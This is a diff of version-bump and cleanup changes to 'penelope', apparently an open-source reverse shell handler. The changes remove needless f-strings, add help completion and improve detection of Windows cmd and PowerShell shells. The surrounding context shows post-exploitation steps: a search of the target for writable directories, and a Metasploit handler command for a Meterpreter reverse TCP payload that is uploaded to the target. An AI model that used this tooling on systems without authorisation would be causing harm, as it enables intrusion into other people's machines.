@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.13.10"
+__version__ = "0.13.11"
 
 import os
 import io
@@ -573,7 +573,7 @@ class BetterCMD:
 			return func(arg)
 
 	def default(self, line):
-		cmdlogger.error(f"Invalid command")
+		cmdlogger.error("Invalid command")
 
 	def interrupt(self):
 		pass
@@ -822,7 +822,7 @@ class MainMenu(BetterCMD):
 				else:
 					cmdlogger.warning(
 						f"No such command: '{command}'. "
-						f"Issue 'help' for all available commands"
+						"Issue 'help' for all available commands"
 					)
 		else:
 			for section in self.commands:
@@ -1032,7 +1032,7 @@ class MainMenu(BetterCMD):
 			if len(items) > options.max_open_files:
 				cmdlogger.warning(
 					f"More than {options.max_open_files} items selected"
-					f" for opening. The open list is truncated to "
+					" for opening. The open list is truncated to "
 					f"{options.max_open_files}."
 				)
 				items = items[:options.max_open_files]
@@ -1481,6 +1481,9 @@ class MainMenu(BetterCMD):
 	def complete_run(self, text, line, begidx, endidx):
 		return [module.__name__ for module in modules().values() if module.__name__.startswith(text)]
 
+	def complete_help(self, text, line, begidx, endidx):
+		return [command for command in self.raw_commands if command.startswith(text)]
+
 
 class ControlQueue:
 
@@ -1581,7 +1584,7 @@ class Core:
 					if command:
 						logger.debug(f"About to execute {command}")
 					else:
-						logger.debug(f"Core break")
+						logger.debug("Core break")
 					try:
 						exec(command)
 					except KeyError: # TODO
@@ -1632,9 +1635,10 @@ class Core:
 							raise OSError
 
 					except OSError:
-						logger.debug(f"Died while reading")
+						logger.debug("Died while reading")
 						readable.kill()
-						threading.Thread(target=readable.maintain).start()
+						if readable.OS:
+							threading.Thread(target=readable.maintain).start()
 						break
 
 					target = readable.shell_response_buf\
@@ -1685,7 +1689,7 @@ class Core:
 					try:
 						sent = writable.socket.send(writable.outbuf.getvalue())
 					except OSError:
-						logger.debug(f"Died while writing")
+						logger.debug("Died while writing")
 						writable.kill()
 						threading.Thread(target=writable.maintain).start()
 						break
@@ -1702,7 +1706,7 @@ class Core:
 		options.maintain = 0
 
 		if self.sessions:
-			logger.warning(f"Killing sessions...")
+			logger.warning("Killing sessions...")
 			for session in reversed(list(self.sessions.copy().values())):
 				session.kill()
 
@@ -2008,7 +2012,7 @@ class Session:
 
 					except socket.herror:
 						self.hostname = ''
-						logger.debug(f"Cannot resolve hostname")
+						logger.debug("Cannot resolve hostname")
 				else:
 					self.hostname = target
 
@@ -2307,7 +2311,7 @@ class Session:
 	def tmp(self):
 		if self._tmp is None:
 			if self.OS == "Unix":
-				logger.debug(f"Trying to find a writable directory on target")
+				logger.debug("Trying to find a writable directory on target")
 				tmpname = rand(10)
 				common_dirs = ("/dev/shm", "/tmp", "/var/tmp")
 				for directory in common_dirs:
@@ -2316,7 +2320,7 @@ class Session:
 						self._tmp = directory
 						break
 				else:
-					candidate_dirs = self.exec(f'find / -type d -writable 2>/dev/null')
+					candidate_dirs = self.exec("find / -type d -writable 2>/dev/null")
 					if candidate_dirs:
 						for directory in candidate_dirs.decode().splitlines():
 							if directory in common_dirs:
@@ -2399,12 +2403,19 @@ class Session:
 				data = data.decode()
 			except:
 				return False
+
 			if var_value1 + var_value2 in data:
 				return True
+
 			elif f"'{var_name1}' is not recognized as an internal or external command" in data:
 				return re.search('batch file.*>', data, re.DOTALL)
+			elif re.search('PS.*>', data, re.DOTALL):
+				return True
+
 			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in data:
 				return re.search('or operable.*>', data, re.DOTALL)
+			elif re.search('Microsoft Windows.*>', data, re.DOTALL):
+				return True
 
 		response = self.exec(
 			f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}\n",
@@ -2420,7 +2431,8 @@ class Session:
 				self.echoing = f"echo ${var_name1}${var_name2}" in response
 				self.prompt = response.split(var_value1 + var_value2)[-1].lstrip().encode()
 
-			elif f"'{var_name1}' is not recognized as an internal or external command" in response:
+			elif f"'{var_name1}' is not recognized as an internal or external command" in response or \
+					re.search('Microsoft Windows.*>', response, re.DOTALL):
 				self.OS = 'Windows'
 				self.type = 'Basic'
 				self.subtype = 'cmd'
@@ -2429,14 +2441,15 @@ class Session:
 				self.prompt = response.splitlines()[-1].encode()
 				self.version = re.search(r"Microsoft Windows \[Version (.*)\]", response, re.DOTALL)[1]
 
-			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response:
+			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response or \
+					re.search('PS.*>', response, re.DOTALL):
 				self.OS = 'Windows'
 				self.type = 'Basic'
 				self.subtype = 'psh'
 				self.interactive = True
 				self.echoing = False
 				self.prompt = response.splitlines()[-1].encode()
-		else:
+		else: #TODO check if it is needed
 			def expect(data):
 				try:
 					data = data.decode()
@@ -2466,9 +2479,9 @@ class Session:
 					columns, lines = shutil.get_terminal_size()
 					cmd = (
 						f"$width={columns}; $height={lines}; "
-						f"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
-						f"$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
-						f"-ArgumentList ($width, $height)"
+						"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
+						"$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
+						"-ArgumentList ($width, $height)"
 					)
 					self.exec(cmd)
 					self.prompt = response.splitlines()[-2].encode()
@@ -2777,7 +2790,7 @@ class Session:
 
 					elif expect_func:
 						if expect_func(buffer.getvalue()):
-							logger.debug(paint(f"The expected strings found in data").yellow)
+							logger.debug(paint("The expected strings found in data").yellow)
 							self.subchannel.result = buffer.getvalue()
 						else:
 							logger.debug(paint('No expected strings found in data. Receive again...').yellow)
@@ -2809,7 +2822,7 @@ class Session:
 			f"\n  1) Upload {paint(url).blue}{paint().magenta}"
 			f"\n  2) Upload local {name} binary"
 			f"\n  3) Specify remote {name} binary path"
-			f"\n  4) None of the above\n"
+			 "\n  4) None of the above\n"
 		)
 		print(paint(options).magenta)
 		answer = ask("Select action: ")
@@ -3086,6 +3099,7 @@ class Session:
 		if core.attached_session is None:
 			return False
 
+		core.wait_input = False
 		core.attached_session = None
 		core.rlist.remove(sys.stdin)
 
@@ -3857,7 +3871,7 @@ class Session:
 		thread_name = threading.current_thread().name
 		logger.debug(f"Thread <{thread_name}> wants to kill session {self.id}")
 
-		if thread_name != 'Core':
+		if self.OS and thread_name != 'Core':
 			if self.need_control_sessions and\
 				not self.spare_control_sessions and\
 				self.control_session is self:
@@ -3898,7 +3912,7 @@ class Session:
 		self.socket.close()
 
 		if not self.OS:
-			message = f"Invalid shell from {self.name_colored} 🙄"
+			message = f"Invalid shell from {self.ip} 🙄"
 		else:
 			del core.sessions[self.id]
 			core.hosts[self.name].remove(self)
@@ -4392,8 +4406,8 @@ class meterpreter(Module):
 				uploaded_path = session.upload(payload_path)
 				if uploaded_path:
 					meterpreter_handler_cmd = (
-						f'msfconsole -x "use exploit/multi/handler; '
-						f'set payload windows/meterpreter/reverse_tcp; '
+						'msfconsole -x "use exploit/multi/handler; '
+						'set payload windows/meterpreter/reverse_tcp; '
 						f'set LHOST {host}; set LPORT {port}; run"'
 					)
 					Open(meterpreter_handler_cmd, terminal=True)
@@ -4854,14 +4868,14 @@ class Options:
 				value = self.max_maintain
 			if value < 1:
 				value = 1
-			#if value == 1: show(f"Maintain value should be 2 or above")
+			#if value == 1: show("Maintain value should be 2 or above")
 			if value > 1 and self.single_session:
-				show(f"Single Session mode disabled because Maintain is enabled")
+				show("Single Session mode disabled because Maintain is enabled")
 				self.single_session = False
 
 		elif option == 'single_session':
 			if self.maintain > 1 and value:
-				show(f"Single Session mode disabled because Maintain is enabled")
+				show("Single Session mode disabled because Maintain is enabled")
 				value = False
 
 		elif option == 'no_bins':
